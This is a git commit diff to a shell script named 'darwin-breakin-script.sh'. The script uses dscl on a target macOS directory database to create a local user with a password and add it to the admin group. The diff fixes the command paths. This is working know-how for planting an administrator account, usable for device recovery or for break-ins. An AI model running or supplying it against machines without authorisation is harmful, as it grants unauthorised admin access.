b84c199894fb236fde57fc8159ae1f3e444dedea
thatsysadmin <65380846+thatsysadmin@users.noreply.github.com>
2024-02-07 20:37:33 -0800

    whoops

--- darwin-breakin-script.sh
+++ darwin-breakin-script.sh
@@ -6,11 +6,11 @@ UID="101"
 GID="20"
 
 dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME
-dscl -f "$DSCL_DB" localonly -create UserShell /bin/zsh
-dscl -f "$DSCL_DB" localonly -create RealName $USERNAME
-dscl -f "$DSCL_DB" localonly -create UniqueID "$UID"
-dscl -f "$DSCL_DB" localonly -create PrimaryGroupID "$GID"
-dscl -f "$DSCL_DB" localonly -create NFSHomeDirectory /Users/$USERNAME
-dscl -f "$DSCL_DB" localonly -passwd $PASSWORD
-dscl . -append /Groups/admin GroupMembership $USERNAME
+dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME UserShell /bin/zsh
+dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME RealName $USERNAME
+dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME UniqueID "$UID"
+dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME PrimaryGroupID "$GID"
+dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME NFSHomeDirectory /Users/$USERNAME
+dscl -f "$DSCL_DB" localonly -passwd /Local/Target/Users/$USERNAME $PASSWORD
+dscl -f "$DSCL_DB" localonly -append /Local/Target/Groups/admin GroupMembership $USERNAME
 echo "Done."
